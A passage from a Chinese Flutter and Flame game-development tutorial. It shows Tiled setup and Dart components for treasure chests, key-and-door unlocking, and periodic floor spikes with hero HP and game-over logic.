<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f66a0b0d129e4d2cb010490532f8ecc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=E9i88QuVDqSjv3FZkmwwKvefU6M%3D" width="100%" loading="lazy"/>
<ol>
<li>新建 <code>Object Layer</code> 图层，命名为 <code>treasure</code>。</li>
<li>点击使用上方矩形框选工具。</li>
<li>在地图中所需位置，正确绘制宝箱大小的矩形。</li>
<li>添加属性：</li>
</ol>
<ul>
<li>type：<strong>trasure</strong></li>
<li>status：表示 <strong>宝箱状态</strong>，一共有三种：<strong>closed（关闭）</strong>、<strong>full（打开未拿取）</strong>、<strong>enmpty（打开已拿取）</strong></li>
</ul>
<h4 data-id="heading-21">3. 构建宝箱类</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// treasure_component.dart</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TreasureComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SpriteComponent</span>
    <span class="hljs-title">with</span> <span class="hljs-title">HasGameReference</span>&lt;<span class="hljs-title">MyGame</span>&gt;, <span class="hljs-title">CollisionCallbacks</span> </span>{
  <span class="hljs-built_in">String</span> status;
  <span class="hljs-keyword">late</span> RectangleHitbox _hitbox;

  TreasureComponent({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.status,
    <span class="hljs-keyword">required</span> Vector2 position,
    <span class="hljs-keyword">required</span> Vector2 size,
  }) : <span class="hljs-keyword">super</span>(position: position, size: size);

  <span class="hljs-meta">@override</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; onLoad() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-keyword">super</span>.onLoad();

    sprite = <span class="hljs-keyword">await</span> Sprite.load(
      status == <span class="hljs-string">'closed'</span>
          ? <span class="hljs-string">'closed_treasure.png'</span>
          : status == <span class="hljs-string">'full'</span>
              ? <span class="hljs-string">'full_treasure.png'</span>
              : <span class="hljs-string">'empty_treasure.png'</span>,
    );

    _hitbox = RectangleHitbox();
    add(_hitbox);
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> onCollisionStart(
    <span class="hljs-built_in">Set</span>&lt;Vector2&gt; intersectionPoints,
    PositionComponent other,
  ) {
    <span class="hljs-keyword">super</span>.onCollisionStart(intersectionPoints, other);
    <span class="hljs-keyword">if</span> (other <span class="hljs-keyword">is</span> HeroComponent) {
      attemptOpen(other);
    }
  }

  Future&lt;<span class="hljs-keyword">void</span>&gt; _open() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (status == <span class="hljs-string">'closed'</span>) {
      status = <span class="hljs-string">'full'</span>;
      sprite = <span class="hljs-keyword">await</span> Sprite.load(<span class="hljs-string">'full_treasure.png'</span>);
    }
  }

  Future&lt;<span class="hljs-keyword">void</span>&gt; _collect(HeroComponent hero) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (status == <span class="hljs-string">'full'</span>) {
      status = <span class="hljs-string">'empty'</span>;
      sprite = <span class="hljs-keyword">await</span> Sprite.load(<span class="hljs-string">'empty_treasure.png'</span>);
      UiNotify.showToast(game, <span class="hljs-string">'获得宝物'</span>);
    }
  }

  <span class="hljs-keyword">void</span> attemptOpen(HeroComponent hero) {
    <span class="hljs-keyword">if</span> (status == <span class="hljs-string">'closed'</span>) {
      _open();
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (status == <span class="hljs-string">'full'</span>) {
      <span class="hljs-keyword">final</span> exists = game.camera.viewport.children
          .query&lt;DialogComponent&gt;()
          .isNotEmpty;
      <span class="hljs-keyword">if</span> (!exists) {
        <span class="hljs-keyword">final</span> dialog = DialogComponent.confirm(
          message: <span class="hljs-string">'是否拿取宝物'</span>,
          onConfirm: () =&gt; _collect(hero),
          onCancel: () {},
        );
        game.camera.viewport.add(dialog);
      }
    }
  }
}
</code></pre>
<p><code>TreasureComponent</code> 作为宝箱实体类,负责 <strong>显示与交互</strong> 的逻辑：</p>
<ul>
<li>
<p><strong>继承 <code>SpriteComponent</code> + 碰撞回调</strong></p>
<ul>
<li>具备位置、尺寸和碰撞检测能力</li>
</ul>
</li>
<li>
<p><strong>状态管理</strong></p>
<ul>
<li><code>status = closed</code>：关闭状态，触碰后自动打开</li>
<li><code>status = full</code>：已打开状态，弹出对话框确认是否拾取</li>
<li><code>status = empty</code>：已拿取状态，仅显示空宝箱</li>
</ul>
</li>
<li>
<p><strong>视图更新</strong></p>
<ul>
<li>根据宝箱状态动态加载不同贴图</li>
</ul>
</li>
<li>
<p><strong>交互逻辑</strong></p>
<ul>
<li>人物触碰到宝箱区域后，根据当前状态，决定下一步行为</li>
</ul>
</li>
</ul>
<h4 data-id="heading-22">4. 加载宝箱</h4>
<pre><code class="hljs language-dart" lang="dart">    <span class="hljs-comment">// my_game.dart</span>

    <span class="hljs-keyword">final</span> treasureLayer = tiled.tileMap.getLayer&lt;ObjectGroup&gt;(<span class="hljs-string">'treasure'</span>);

    <span class="hljs-keyword">if</span> (treasureLayer != <span class="hljs-keyword">null</span>) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> obj <span class="hljs-keyword">in</span> treasureLayer.objects) {
        <span class="hljs-keyword">if</span> (obj.properties[<span class="hljs-string">'type'</span>]?.value == <span class="hljs-string">'treasure'</span>) {
          <span class="hljs-keyword">final</span> status = obj.properties[<span class="hljs-string">'status'</span>]!.value <span class="hljs-keyword">as</span> <span class="hljs-built_in">String</span>;
          <span class="hljs-keyword">final</span> x = mapScale * obj.x;
          <span class="hljs-keyword">final</span> y = mapScale * obj.y;
          <span class="hljs-keyword">final</span> w = mapScale * obj.width;
          <span class="hljs-keyword">final</span> h = mapScale * obj.height;
          <span class="hljs-keyword">final</span> treasureComponent = TreasureComponent(
            status: status,
            position: Vector2(x, y),
            size: Vector2(w, h),
          );
          treasureComponent.debugMode = <span class="hljs-keyword">true</span>;
          <span class="hljs-keyword">await</span> world.add(treasureComponent);
        }
      }
    }
</code></pre>
<h3 data-id="heading-23">六. 钥匙与门 - 验证交互式解锁</h3>
 <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c641f2a2275348e8866403f6534892c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=gAK8%2FQYRh0GFgSYgXeZUqpDqKw8%3D" width="49%" height="400" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7133938e4b304827b8ca75f87d655cf1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=FyjsdzJOwUFBFzlbEmjgs9ZhkVQ%3D" width="49%" height="400" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b0495310526464485e1c9172960dfce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=gCxZLyGeUignUPz%2ByLTpB9cC1zU%3D" width="100%" loading="lazy"/>
<h4 data-id="heading-24">1. 简述</h4>
<p><strong>钥匙与门</strong> 是一组具备条件验证的交互对象，通过 <code>拾取钥匙 → 解锁对应门</code> 实现地图通行控制。</p>
<ul>
<li>
<p><strong>继承关系</strong>：门继承碰撞基类，当门未打开时具备阻挡能力，与墙体或水面碰撞逻辑一致</p>
</li>
<li>
<p><strong>钥匙</strong>：可拾取对象，角色接触后获得对应 <code>keyId</code></p>
</li>
<li>
<p><strong>门</strong>：阻挡地图通行，需角色持有匹配钥匙才能打开</p>
</li>
<li>
<p><strong>交互逻辑</strong>：</p>
<ul>
<li>角色与门交互时，判断是否持有匹配钥匙</li>
<li>条件满足时门打开，否则保持阻挡状态</li>
</ul>
</li>
</ul>
<h4 data-id="heading-25">2. Tiled 前置工作</h4>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36dbd7a9048848699cfcd6dd843995b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=lnUwELyjabfpaotBegCyvbdVAOE%3D" width="100%" loading="lazy"/>
<ol>
<li>新建两个 <code>Object Layer</code> 图层，分别命名为 <code>key</code>、<code>door</code>。</li>
<li>点击使用上方矩形框选工具。</li>
<li>在地图中所需位置，正确绘制钥匙和门大小的矩形。</li>
<li>添加属性：</li>
</ol>
<ul>
<li><code>钥匙</code>：
<ul>
<li>type：<strong>key</strong></li>
<li>keyId：对应指定的钥匙与门</li>
</ul>
</li>
<li><code>门</code>：
<ul>
<li>type：<strong>door</strong></li>
<li>keyId：对应指定的钥匙与门</li>
<li>status：表示 <strong>门状态</strong>，一共有两种：<strong>closed（关闭）</strong>、<strong>open（打开）</strong></li>
<li/>
</ul>
</li>
</ul>
<h4 data-id="heading-26">3. 构建钥匙类</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// key_component.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KeyComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SpriteComponent</span>
    <span class="hljs-title">with</span> <span class="hljs-title">HasGameReference</span>&lt;<span class="hljs-title">MyGame</span>&gt;, <span class="hljs-title">CollisionCallbacks</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> keyId;

  KeyComponent({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.keyId,
    <span class="hljs-keyword">required</span> Vector2 position,
    <span class="hljs-keyword">required</span> Vector2 size,
  }) : <span class="hljs-keyword">super</span>(position: position, size: size);

  <span class="hljs-meta">@override</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; onLoad() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-keyword">super</span>.onLoad();
    sprite = <span class="hljs-keyword">await</span> Sprite.load(<span class="hljs-string">'key.png'</span>); <span class="hljs-comment">// 直接加载 assets/key.png</span>
    add(RectangleHitbox());
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> onCollisionStart(<span class="hljs-built_in">Set</span>&lt;Vector2&gt; intersectionPoints, PositionComponent other) {
    <span class="hljs-keyword">super</span>.onCollisionStart(intersectionPoints, other);
    <span class="hljs-keyword">if</span> (other <span class="hljs-keyword">is</span> HeroComponent) {
      other.addKey(keyId);
      removeFromParent(); <span class="hljs-comment">// 拾取后移除当前 tile</span>
    }
  }
}
</code></pre>
<p><code>KeyComponent</code> 作为<strong>可拾取的钥匙实体</strong>，用于角色解锁对应门：</p>
<ul>
<li>
<p><strong>继承 <code>SpriteComponent</code> + 碰撞回调</strong></p>
<ul>
<li>具备位置、尺寸和碰撞检测能力</li>
</ul>
</li>
<li>
<p><strong>钥匙标识 <code>keyId</code></strong></p>
<ul>
<li>用于与门的 <code>keyId</code> 对应，实现解锁验证</li>
</ul>
</li>
<li>
<p><strong>碰撞拾取逻辑</strong></p>
<ul>
<li>当角色碰到钥匙：<br/>
将 <code>keyId</code> 存入角色钥匙集合<br/>
从地图中移除钥匙实体，避免重复拾取</li>
</ul>
</li>
</ul>
<h4 data-id="heading-27">4. 构建门类</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// door_component.dart</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DoorComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BlockerComponent</span> <span class="hljs-title">with</span> <span class="hljs-title">HasGameReference</span>&lt;<span class="hljs-title">MyGame</span>&gt; </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> keyId;
  <span class="hljs-built_in">bool</span> isOpen;

  DoorComponent({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.keyId,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.isOpen,
    <span class="hljs-keyword">super</span>.position,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">super</span>.size,
  }) : <span class="hljs-keyword">super</span>(
    addHitbox: !isOpen);

  <span class="hljs-meta">@override</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; onLoad() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-keyword">super</span>.onLoad();
    sprite = <span class="hljs-keyword">await</span> Sprite.load(isOpen ? <span class="hljs-string">'open_door.png'</span> : <span class="hljs-string">'closed_door.png'</span>);
  }

  <span class="hljs-keyword">void</span> _unlock() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (!isOpen) {
      isOpen = <span class="hljs-keyword">true</span>;
      sprite = <span class="hljs-keyword">await</span> Sprite.load(<span class="hljs-string">'open_door.png'</span>);
      hitbox.removeFromParent();
    }
  }

  <span class="hljs-keyword">void</span> attemptOpen(HeroComponent hero) {
    <span class="hljs-keyword">if</span> (!isOpen &amp;&amp; hero.hasKey(keyId)) {
      unlock();
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!isOpen) {
      UiNotify.showToast(game, <span class="hljs-string">'需要钥匙 <span class="hljs-subst">$keyId</span> 才能打开'</span>);
    }
  }
}
</code></pre>
<p><code>DoorComponent</code> 作为门的实体类，主要职责是 <strong>阻挡角色通行并支持钥匙验证解锁</strong>：</p>
<ul>
<li>
<p><strong>继承 <code>BlockerComponent</code></strong></p>
<ul>
<li>默认有碰撞体阻挡角色</li>
<li>可根据 <code>isOpen</code> 状态决定是否添加碰撞体</li>
</ul>
</li>
<li>
<p><strong>状态管理</strong></p>
<ul>
<li><code>isOpen = false</code>：门关闭，阻挡角色</li>
<li><code>isOpen = true</code>：门打开，移除碰撞体，允许角色通过</li>
</ul>
</li>
<li>
<p><strong>钥匙验证逻辑</strong></p>
<ul>
<li>
<p><code>attemptOpen(hero)</code>：当角色接触门时触发</p>
<ul>
<li>如果角色持有匹配 <code>keyId</code>，调用 <code>_unlock()</code> 打开门</li>
<li>否则弹出提示，告知需要钥匙</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>视图更新</strong></p>
<ul>
<li>根据门状态动态加载不同贴图（<code>open_door.png</code> / <code>closed_door.png</code>）</li>
<li>打开时同步移除碰撞体，保证角色能通过</li>
</ul>
</li>
</ul>
<h4 data-id="heading-28">5. 加载钥匙与门</h4>
<pre><code class="hljs language-dart" lang="dart">    <span class="hljs-comment">// my_game.dart</span>

    <span class="hljs-comment">// ---- 处理 Key Layer 中的钥匙 ----</span>
    <span class="hljs-keyword">final</span> keyLayer = tiled.tileMap.getLayer&lt;ObjectGroup&gt;(<span class="hljs-string">'key'</span>);
    <span class="hljs-keyword">if</span> (keyLayer != <span class="hljs-keyword">null</span>) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> obj <span class="hljs-keyword">in</span> keyLayer.objects) {
        <span class="hljs-keyword">if</span> (obj.properties[<span class="hljs-string">'type'</span>]?.value == <span class="hljs-string">'key'</span>) {
          <span class="hljs-keyword">final</span> keyId = obj.properties[<span class="hljs-string">'keyId'</span>]!.value <span class="hljs-keyword">as</span> <span class="hljs-built_in">String</span>;
          <span class="hljs-keyword">final</span> x = mapScale * obj.x;
          <span class="hljs-keyword">final</span> y = mapScale * obj.y;
          <span class="hljs-keyword">final</span> w = mapScale * obj.width;
          <span class="hljs-keyword">final</span> h = mapScale * obj.height;
          <span class="hljs-keyword">final</span> keyComponent = KeyComponent(
            keyId: keyId,
            <span class="hljs-comment">// Tiled 对象坐标为左上或底对齐；这里使用底对齐放置更符合 tile 外观</span>
            position: Vector2(x, y),
            size: Vector2(w, h),
          );
          keyComponent.debugMode = <span class="hljs-keyword">true</span>;
          <span class="hljs-keyword">await</span> world.add(keyComponent);
        }
      }
    }
    
    <span class="hljs-comment">// ---- 处理 Door Layer 中的门 ----</span>
    <span class="hljs-keyword">final</span> doorLayer = tiled.tileMap.getLayer&lt;ObjectGroup&gt;(<span class="hljs-string">'door'</span>);
    <span class="hljs-keyword">if</span> (doorLayer != <span class="hljs-keyword">null</span>) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> obj <span class="hljs-keyword">in</span> doorLayer.objects) {
        <span class="hljs-keyword">if</span> (obj.properties[<span class="hljs-string">'type'</span>]?.value == <span class="hljs-string">'door'</span>) {
          <span class="hljs-keyword">final</span> keyId = obj.properties[<span class="hljs-string">'keyId'</span>]!.value <span class="hljs-keyword">as</span> <span class="hljs-built_in">String</span>;
          <span class="hljs-keyword">final</span> x = mapScale * obj.x;
          <span class="hljs-keyword">final</span> y = mapScale * obj.y;
          <span class="hljs-keyword">final</span> w = mapScale * obj.width;
          <span class="hljs-keyword">final</span> h = mapScale * obj.height;
          <span class="hljs-keyword">final</span> doorComponent = DoorComponent(
            keyId: keyId,
            isOpen: obj.properties[<span class="hljs-string">'status'</span>]?.value == <span class="hljs-string">'open'</span> ? <span class="hljs-keyword">true</span> : <span class="hljs-keyword">false</span>,
            <span class="hljs-comment">// Tiled 对象坐标为左上或底对齐；这里使用底对齐放置更符合 tile 外观</span>
            position: Vector2(x, y),
            size: Vector2(w, h),
          );
          doorComponent.debugMode = <span class="hljs-keyword">true</span>;
          <span class="hljs-keyword">await</span> world.add(doorComponent);
        }
      }
    }
</code></pre>
<h4 data-id="heading-29">6. 完善逻辑</h4>
<p>在 <code>HeroComponent</code> 中，为角色添加 <strong>钥匙管理与门验证</strong> 功能：</p>
<h5 data-id="heading-30">(1). 钥匙管理</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">final</span> <span class="hljs-built_in">Set</span>&lt;<span class="hljs-built_in">String</span>&gt; keys = {};
</code></pre>
<ul>
<li>存储角色已拾取的钥匙 <code>keyId</code> 集合</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">void</span> addKey(<span class="hljs-built_in">String</span> keyId) {
  keys.add(keyId);
  UiNotify.showToast(game, <span class="hljs-string">'获得钥匙: <span class="hljs-subst">$keyId</span>'</span>);
}
</code></pre>
<ul>
<li>角色拾取钥匙时调用</li>
<li>弹出提示通知玩家获得钥匙</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-built_in">bool</span> hasKey(<span class="hljs-built_in">String</span> keyId) =&gt; keys.contains(keyId);
</code></pre>
<ul>
<li>判断角色是否持有指定钥匙</li>
<li>用于门解锁验证</li>
</ul>
<hr/>
<h5 data-id="heading-31">(2). 门交互逻辑</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> door <span class="hljs-keyword">in</span> game.world.children.query&lt;DoorComponent&gt;()) {
  <span class="hljs-keyword">if</span> (!door.isOpen &amp;&amp; door.collidesWith(heroRect)) {
    door.attemptOpen(<span class="hljs-keyword">this</span>);
    <span class="hljs-keyword">if</span> (!door.isOpen) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
  }
}
</code></pre>
<p>在角色移动碰撞检测 <code>_wouldCollideWithBlockers()</code> 中：</p>
<ul>
<li>遍历所有门组件</li>
<li>检测角色是否与关闭的门发生碰撞</li>
<li>调用 <code>door.attemptOpen(this)</code> 尝试解锁</li>
<li>如果门仍未打开，则返回阻挡信息，阻止角色移动</li>
</ul>
<h3 data-id="heading-32">七. 地刺</h3>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7165f8043a14465a8da56a9feef4d515~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=Pj4UfE5HRi3HYs5Q%2FD%2FusulKy58%3D" width="100%" loading="lazy"/>
<h4 data-id="heading-33">1. 简述</h4>
<p><strong>地刺</strong> 是一种周期性造成伤害的地图障碍，通过状态切换形成完整的伤害与死亡判定逻辑。</p>
<ul>
<li>
<p><strong>继承关系</strong>：无需继承碰撞基类</p>
</li>
<li>
<p><strong>功能</strong>：对接触的角色造成伤害</p>
</li>
<li>
<p><strong>状态</strong>：突出与收起两种状态，周期性切换</p>
</li>
<li>
<p><strong>交互逻辑</strong>：</p>
<ul>
<li>角色接触突出状态的地刺会受到伤害</li>
<li>触发死亡判定后可触发游戏重启或复活逻辑</li>
<li>周期性切换状态增强地图挑战性</li>
</ul>
</li>
</ul>
<h4 data-id="heading-34">2. Tiled 前置工作</h4>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cfe89b0efc2d4f618ece0cb8e2edcab1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=dk%2Fr6O95jcLYO8PkaEdBnVqiIu8%3D" width="100%" loading="lazy"/>
<ol>
<li>新建 <code>Object Layer</code> 图层，命名为 <code>thorn</code>。</li>
<li>点击使用上方矩形框选工具。</li>
<li>在地图中所需位置，正确绘制地刺大小的矩形。</li>
<li>添加属性：</li>
</ol>
<ul>
<li>type：<strong>thorn</strong></li>
<li>status：表示 <strong>地刺状态</strong>，一共有两种：<strong>on（突出）</strong>、<strong>off（收入）</strong></li>
</ul>
<h4 data-id="heading-35">3. 构建地刺类</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// thorn_component.dart</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThornComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SpriteComponent</span>
    <span class="hljs-title">with</span> <span class="hljs-title">HasGameReference</span>&lt;<span class="hljs-title">MyGame</span>&gt;, <span class="hljs-title">CollisionCallbacks</span> </span>{
  <span class="hljs-built_in">String</span> status;
  <span class="hljs-keyword">late</span> RectangleHitbox _hitbox;

  <span class="hljs-built_in">double</span> _elapsed = <span class="hljs-number">0</span>;
  <span class="hljs-built_in">double</span> period = <span class="hljs-number">2.0</span>;
  <span class="hljs-built_in">bool</span> hurted = <span class="hljs-keyword">false</span>;
  ThornComponent({<span class="hljs-keyword">super</span>.position, <span class="hljs-keyword">required</span> <span class="hljs-keyword">super</span>.size, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.status});

  <span class="hljs-meta">@override</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; onLoad() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-keyword">super</span>.onLoad();
    sprite = <span class="hljs-keyword">await</span> Sprite.load(
      status == <span class="hljs-string">'on'</span> ? <span class="hljs-string">'thorn_on.png'</span> : <span class="hljs-string">'thorn_off.png'</span>,
    );
    _hitbox = RectangleHitbox();
    add(_hitbox);
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> onCollisionStart(
    <span class="hljs-built_in">Set</span>&lt;Vector2&gt; intersectionPoints,
    PositionComponent other,
  ) {
    <span class="hljs-keyword">super</span>.onCollisionStart(intersectionPoints, other);
    <span class="hljs-keyword">if</span> (other <span class="hljs-keyword">is</span> HeroComponent) {
      attemptDamage(other);
    }
  }

  <span class="hljs-keyword">void</span> attemptDamage(HeroComponent hero) {
    <span class="hljs-keyword">if</span> (status == <span class="hljs-string">'on'</span> &amp;&amp; !hurted) {
      hero.loseHp(<span class="hljs-number">1</span>);
      hurted = <span class="hljs-keyword">true</span>;
    }
  }

  <span class="hljs-keyword">void</span> _toggle() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (status == <span class="hljs-string">'on'</span>) {
      status = <span class="hljs-string">'off'</span>;
    } <span class="hljs-keyword">else</span> {
      status = <span class="hljs-string">'on'</span>;
      hurted = <span class="hljs-keyword">false</span>;
    }
    sprite = <span class="hljs-keyword">await</span> Sprite.load(
      status == <span class="hljs-string">'on'</span> ? <span class="hljs-string">'thorn_on.png'</span> : <span class="hljs-string">'thorn_off.png'</span>,
    );
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> update(<span class="hljs-built_in">double</span> dt) {
    <span class="hljs-keyword">super</span>.update(dt);
    _elapsed += dt;
    <span class="hljs-keyword">if</span> (_elapsed &gt;= period) {
      _elapsed = <span class="hljs-number">0</span>;
      _toggle();
    }
  }
}

</code></pre>
<p><code>ThornComponent</code> 负责地刺的<strong>显示、周期切换和伤害逻辑</strong>：</p>
<ul>
<li>
<p><strong>继承 <code>SpriteComponent</code> + 碰撞回调</strong></p>
<ul>
<li>具备位置、尺寸和碰撞检测能力</li>
</ul>
</li>
<li>
<p><strong>状态管理</strong></p>
<ul>
<li><code>on</code>：突出，触碰造成伤害</li>
<li><code>off</code>：收起，不造成伤害</li>
</ul>
</li>
<li>
<p><strong>伤害逻辑</strong></p>
<ul>
<li><code>attemptDamage(hero)</code>：保证每周期只造成一次伤害</li>
</ul>
</li>
<li>
<p><strong>周期切换</strong></p>
<ul>
<li><code>_toggle()</code> 在固定 <code>period</code> 时间间隔内切换状态，并更新贴图</li>
</ul>
</li>
</ul>
<h4 data-id="heading-36">4. 加载地刺</h4>
<pre><code class="hljs language-dart" lang="dart">    <span class="hljs-comment">// my_game.dart</span>
    
    <span class="hljs-comment">// ---- 处理 thorn 中的荆棘 ----</span>
    <span class="hljs-keyword">final</span> thornLayer = tiled.tileMap.getLayer&lt;ObjectGroup&gt;(<span class="hljs-string">'thorn'</span>);
    <span class="hljs-keyword">if</span> (thornLayer != <span class="hljs-keyword">null</span>) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> obj <span class="hljs-keyword">in</span> thornLayer.objects) {
        <span class="hljs-keyword">if</span> (obj.properties[<span class="hljs-string">'type'</span>]?.value == <span class="hljs-string">'thorn'</span>) {
          <span class="hljs-keyword">final</span> status = obj.properties[<span class="hljs-string">'status'</span>]!.value <span class="hljs-keyword">as</span> <span class="hljs-built_in">String</span>;
          <span class="hljs-keyword">final</span> x = mapScale * obj.x;
          <span class="hljs-keyword">final</span> y = mapScale * obj.y;
          <span class="hljs-keyword">final</span> w = mapScale * obj.width;
          <span class="hljs-keyword">final</span> h = mapScale * obj.height;
          <span class="hljs-keyword">final</span> thornComponent = ThornComponent(
            status: status,
            position: Vector2(x, y),
            size: Vector2(w, h),
          );
          thornComponent.debugMode = <span class="hljs-keyword">true</span>;
          <span class="hljs-keyword">await</span> world.add(thornComponent);
        }
      }
    }
</code></pre>
<h4 data-id="heading-37">5. 完善逻辑</h4>
<p>在 <code>HeroComponent</code> 中, 实现了角色 <strong>生命值管理 + 死亡判定</strong> 的功能：</p>
<ul>
<li>
<p>增加 <code>hp</code> 属性，记录角色生命值</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 生命值</span>
<span class="hljs-built_in">int</span> hp = <span class="hljs-number">5</span>;
</code></pre>
</li>
<li>
<p><code>loseHp(amount)</code>：被地刺等障碍伤害时调用，扣除生命值并显示提示</p>
<pre><code class="hljs language-dart" lang="dart"> <span class="hljs-keyword">void</span> loseHp(<span class="hljs-built_in">int</span> amount) {
     hp = hp - amount;
     <span class="hljs-keyword">if</span> (hp &lt;= <span class="hljs-number">0</span>) {
       UiNotify.showToast(game, <span class="hljs-string">'死亡'</span>);
     } <span class="hljs-keyword">else</span> {
       UiNotify.showToast(game, <span class="hljs-string">'HP -<span class="hljs-subst">$amount</span>  剩余 <span class="hljs-subst">$hp</span>'</span>);
     }
 }
</code></pre>
</li>
<li>
<p>当 <code>hp &lt;= 0</code>：触发 <code>gameOver()</code></p>
<ul>
<li>播放死亡动画</li>
<li>2 秒后显示重新开始弹窗</li>
</ul>
<pre><code class="hljs language-dart" lang="dart">  Future&lt;<span class="hljs-keyword">void</span>&gt; gameOver() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (_isGameOver) <span class="hljs-keyword">return</span>;
    _isGameOver = <span class="hljs-keyword">true</span>;

    <span class="hljs-comment">// 播放死亡动画</span>
    <span class="hljs-keyword">if</span> (animations.containsKey(HeroState.dead)) {
      _setState(HeroState.dead);
    }

    <span class="hljs-comment">// 等待 2 秒，让死亡动画播放</span>
    <span class="hljs-keyword">await</span> Future.delayed(<span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">2</span>));

    <span class="hljs-comment">// 显示重新开始弹窗</span>
    <span class="hljs-keyword">final</span> exists = game.camera.viewport.children
        .query&lt;RestartOverlay&gt;()
        .isNotEmpty;
    <span class="hljs-keyword">if</span> (!exists) {
      game.camera.viewport.add(RestartOverlay());
    }
  }
</code></pre>
</li>
</ul>
<h3 data-id="heading-38">八. 总结与展望</h3>
<h4 data-id="heading-39">总结</h4>
<p>本章主要介绍了 <strong>Flutter&amp;Flame</strong> 开发 <strong>2D像素游戏</strong> 关于 <code>人物与地图元素交互</code> 的基础实践。<br/>
通过上述步骤，我们完成了<code>宝箱、钥匙、门 和 地刺</code> 这几类常见元素的交互 。</p>
<p>截至目前为止，游戏主要包括了以下内容：</p>
<ul>
